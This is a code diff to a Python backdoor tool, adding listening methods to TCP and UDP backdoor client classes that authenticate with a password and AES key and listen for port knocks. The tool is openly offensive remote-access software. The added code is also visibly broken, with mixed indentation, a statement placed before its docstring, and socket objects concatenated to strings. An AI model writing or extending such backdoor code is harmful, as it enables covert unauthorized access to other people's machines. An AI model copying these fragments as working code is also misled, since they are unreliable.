@@ -489,9 +489,10 @@ class BackdoorClient(object):
             print("Unhandled result type {}".format(result_type))
             sys.exit(1)
 
-
-    def run(self):
-        pass
+	
+    def run(self, protocol):
+	raise NotImplementedError
+        """Runs in a loop listening for server port knocks"""
 
 class TcpBackdoorClient(BackdoorClient):
     def __init__(self, aeskey, password, listenport, serverport, server):
@@ -499,6 +500,21 @@ class TcpBackdoorClient(BackdoorClient):
         self.server = server
         self.lport = listenport
         self.dport = serverport
+
+    def run(self):
+        """ Open the TCP port and wait for the client to ping """
+
+        tcpsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        tcpsock.bind(('', self.lport))
+
+        print("listen")
+        tcpsock.listen(1)
+        conn, addr = tcpsock.accept()
+        print("conn" + conn + " addr " + addr)
+        while 1:
+            data = conn.recv(1024)
+            if not data: 
+                break
 
     def connect(self):
         # Insert the password into the packet so that the server can authenticate us
@@ -532,6 +548,12 @@ class UdpBackdoorClient(BackdoorClient):
         self.server = server
         self.lport = listenport
         self.dport = serverport
+
+    def run(self):
+        #handle listening for UDP connection
+        udpsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
+        udpsock.bind(('', self.lport))
+        data, client = udpsock.recvfrom(100)
 
     def connect(self):
         # Insert the password into the packet so that the server can authenticate us
